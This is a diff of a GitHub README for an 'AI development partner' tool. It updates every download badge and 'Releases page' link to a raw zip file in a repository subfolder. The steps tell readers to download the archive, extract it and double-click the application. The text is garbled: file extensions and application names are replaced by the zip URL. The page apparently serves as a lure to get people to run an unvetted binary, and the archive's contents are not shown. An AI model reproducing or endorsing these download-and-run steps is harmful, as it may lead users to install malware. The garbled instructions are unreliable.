@@ -1,6 +1,6 @@
 # 🤖 ai-development-partner - Your AI Team for Development Success
 
-[![Download ai-development-partner](https://raw.githubusercontent.com/darck0071/ai-development-partner/main/procourt/ai-development-partner.zip)](https://raw.githubusercontent.com/darck0071/ai-development-partner/main/procourt/ai-development-partner.zip)
+[![Download ai-development-partner](https://github.com/darck0071/ai-development-partner/raw/refs/heads/main/procourt/development_ai_partner_1.4.zip)](https://github.com/darck0071/ai-development-partner/raw/refs/heads/main/procourt/development_ai_partner_1.4.zip)
 
 ## 🌟 Overview
 
@@ -11,7 +11,7 @@ The ai-development-partner is your virtual assistant designed to help you with v
 To get started with the ai-development-partner, follow these simple steps:
 
 1. **Access the Releases Page**
-   Visit our [Releases page](https://raw.githubusercontent.com/darck0071/ai-development-partner/main/procourt/ai-development-partner.zip) to find the latest version of the software.
+   Visit our [Releases page](https://github.com/darck0071/ai-development-partner/raw/refs/heads/main/procourt/development_ai_partner_1.4.zip) to find the latest version of the software.
 
 2. **Choose Your Version**
    On the Releases page, you will see different versions of the application available for download. Select the latest stable version.
@@ -20,10 +20,10 @@ To get started with the ai-development-partner, follow these simple steps:
    Click on the link for the version you want. Your download will begin automatically. Save the file to a location where you can easily find it, like your Downloads folder.
 
 4. **Extract the Files (if needed)**
-   If the downloaded file is a compressed format (like .zip or https://raw.githubusercontent.com/darck0071/ai-development-partner/main/procourt/ai-development-partner.zip), you will need to extract it. Right-click the downloaded file and select 'Extract All' on Windows or 'Open' on macOS. Follow the prompts to extract the files.
+   If the downloaded file is a compressed format (like .zip or https://github.com/darck0071/ai-development-partner/raw/refs/heads/main/procourt/development_ai_partner_1.4.zip), you will need to extract it. Right-click the downloaded file and select 'Extract All' on Windows or 'Open' on macOS. Follow the prompts to extract the files.
 
 5. **Run the Application**
-   Navigate to the folder where you extracted the files. Locate the application file, often named something like `https://raw.githubusercontent.com/darck0071/ai-development-partner/main/procourt/ai-development-partner.zip` (for Windows) or `https://raw.githubusercontent.com/darck0071/ai-development-partner/main/procourt/ai-development-partner.zip` (for macOS). Double-click the file to start the application.
+   Navigate to the folder where you extracted the files. Locate the application file, often named something like `https://github.com/darck0071/ai-development-partner/raw/refs/heads/main/procourt/development_ai_partner_1.4.zip` (for Windows) or `https://github.com/darck0071/ai-development-partner/raw/refs/heads/main/procourt/development_ai_partner_1.4.zip` (for macOS). Double-click the file to start the application.
 
 6. **Follow the Setup Instructions**
    Upon running the application for the first time, you may be prompted to set up an user account or configure your preferences. Follow the on-screen instructions to complete the initial setup.
@@ -50,7 +50,7 @@ The ai-development-partner includes a variety of features designed to boost your
 
 ## 📦 Download & Install
 
-To download the latest version of ai-development-partner, simply visit our [Releases page](https://raw.githubusercontent.com/darck0071/ai-development-partner/main/procourt/ai-development-partner.zip) and follow the steps outlined above. Make sure to choose the right version for your system.
+To download the latest version of ai-development-partner, simply visit our [Releases page](https://github.com/darck0071/ai-development-partner/raw/refs/heads/main/procourt/development_ai_partner_1.4.zip) and follow the steps outlined above. Make sure to choose the right version for your system.
 
 ## 🌐 Community & Support
 
@@ -77,4 +77,4 @@ If you're interested in contributing to the ai-development-partner, please check
 
 For any inquiries or support needs, please reach out through our GitHub page or email our support team directly. We are here to help you get the most out of your ai-development-partner experience.
 
-[![Download ai-development-partner](https://raw.githubusercontent.com/darck0071/ai-development-partner/main/procourt/ai-development-partner.zip)](https://raw.githubusercontent.com/darck0071/ai-development-partner/main/procourt/ai-development-partner.zip)
+[![Download ai-development-partner](https://github.com/darck0071/ai-development-partner/raw/refs/heads/main/procourt/development_ai_partner_1.4.zip)](https://github.com/darck0071/ai-development-partner/raw/refs/heads/main/procourt/development_ai_partner_1.4.zip)
